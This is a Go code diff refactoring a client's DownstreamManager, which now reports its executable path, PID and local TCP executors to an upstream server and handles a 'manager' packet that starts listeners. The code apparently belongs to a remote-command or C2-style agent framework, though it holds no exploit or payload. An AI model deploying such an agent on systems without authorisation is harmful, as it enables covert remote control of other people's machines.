@@ -1,6 +1,7 @@
 package client
 
 import (
+	"fmt"
 	"os"
 	"strconv"
 	"strings"
@@ -17,6 +18,8 @@ type DownstreamInfo struct {
 }
 
 type DownstreamManager struct {
+	upstream UpstreamHttp // used to send notifications
+
 	downstreamClient     DownstreamClient
 	downstreamClientInfo string
 
@@ -24,32 +27,61 @@ type DownstreamManager struct {
 	downstreamLocaltcpChannel chan struct{} // Notify only
 }
 
-func MakeDownstreamManager() DownstreamManager {
-	downstreamClient := MakeDownstreamClient()
-	downstreamLocaltcp := MakeDownstreamLocaltcp("")
-
-	downstreamManager := DownstreamManager{
-		downstreamClient,
-		"client.exe",
-
-		downstreamLocaltcp,
-		make(chan struct{}),
-	}
-	return downstreamManager
-}
-
-// startListeners will set up all downstreams which have a listening component as threads
-func (dm *DownstreamManager) StartListeners(client *Client) {
-
-	// Do it here for now, as it is always executed
+func MakeDownstreamManager(upstream UpstreamHttp) DownstreamManager {
+	// Get our name (for channel identification)
 	ex, err := os.Executable()
 	if err != nil {
 		log.Error("Error: " + err.Error())
 	}
 	pid := strconv.Itoa(os.Getpid())
-	line := ex + ":" + pid + "\n"
-	dm.downstreamClientInfo = line
+	downstreamClientInfo := ex + ":" + pid + "\n"
 
+	downstreamClient := MakeDownstreamClient()
+	downstreamLocaltcp := MakeDownstreamLocaltcp("")
+
+	downstreamManager := DownstreamManager{
+		upstream:                  upstream,
+		downstreamClient:          downstreamClient,
+		downstreamClientInfo:      downstreamClientInfo,
+		downstreamLocaltcp:        downstreamLocaltcp,
+		downstreamLocaltcpChannel: make(chan struct{}),
+	}
+	return downstreamManager
+}
+
+func (dm *DownstreamManager) Do(packet model.Packet) (model.Packet, error) {
+	if packet.DownstreamId == "manager" {
+		return dm.doManager(packet)
+	} else if packet.DownstreamId == "client" {
+		return dm.downstreamClient.do(packet)
+	} else if strings.HasPrefix(packet.DownstreamId, "net") { // net#1
+		return dm.downstreamLocaltcp.do(packet)
+	} else {
+		return dm.downstreamClient.do(packet)
+	}
+}
+
+func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error) {
+	if packet.DownstreamId != "manager" {
+		return packet, fmt.Errorf("Wrong args")
+	}
+	if packet.PacketType == "downstreamStart" {
+		log.Info("Downstreamstart")
+		ret, err := dm.StartListeners()
+		if err != nil {
+			packet.Response["err"] = err.Error()
+		} else {
+			packet.Response["ret"] = ret
+		}
+	} else {
+		packet.Response["ret"] = "packettype not known"
+	}
+
+	return packet, nil
+}
+
+// startListeners will set up all downstreams which have a listening component as threads
+func (dm *DownstreamManager) StartListeners() (string, error) {
 	// Thread: new downstreams via downstreamLocaltcpChannel
 	go dm.downstreamLocaltcp.startServer(dm.downstreamLocaltcpChannel)
 
@@ -60,34 +92,38 @@ func (dm *DownstreamManager) StartListeners(client *Client) {
 			<-dm.downstreamLocaltcpChannel
 
 			// Notify server
-			dm.SendDownstreams(client)
+			dm.SendDownstreams()
 
 			// TODO when to quit thread
 		}
 	}()
+
+	return "Started on ...", nil
 }
 
-func (dm *DownstreamManager) Do(packet model.Packet) (model.Packet, error) {
-	if packet.DownstreamId == "client" {
-		return dm.downstreamClient.do(packet)
-	} else if strings.HasPrefix(packet.DownstreamId, "net") { // net#1
-		return dm.downstreamLocaltcp.do(packet)
-	} else {
-		return dm.downstreamClient.do(packet)
-	}
-}
+func (dm *DownstreamManager) SendDownstreams() {
+	// notify server of new downstream executors
 
-func (dm *DownstreamManager) SendDownstreams(client *Client) {
 	downstreams := make([]DownstreamInfo, 0)
 	downstreamInfoClient := DownstreamInfo{
 		"client",
 		dm.downstreamClientInfo,
 	}
 	downstreamInfoTcp := dm.downstreamLocaltcp.DownstreamList()
-
 	downstreams = append(downstreams, downstreamInfoClient)
 	downstreams = append(downstreams, downstreamInfoTcp...)
 
-	// Notify server
-	client.SendDownstreams(downstreams) // notify server of new downstream executors
+	arguments := make(model.PacketArgument)
+	response := make(model.PacketResponse)
+	for idx, downstreamInfo := range downstreams {
+		idxStr := strconv.Itoa(idx)
+		response["name"+idxStr] = downstreamInfo.Name
+		response["info"+idxStr] = downstreamInfo.Info
+	}
+	packet := model.NewPacket("downstreams", "", "", arguments, response)
+
+	err := dm.upstream.SendOutofband(packet)
+	if err != nil {
+		log.Errorf("Senddownstreams send error: %s", err.Error())
+	}
 }
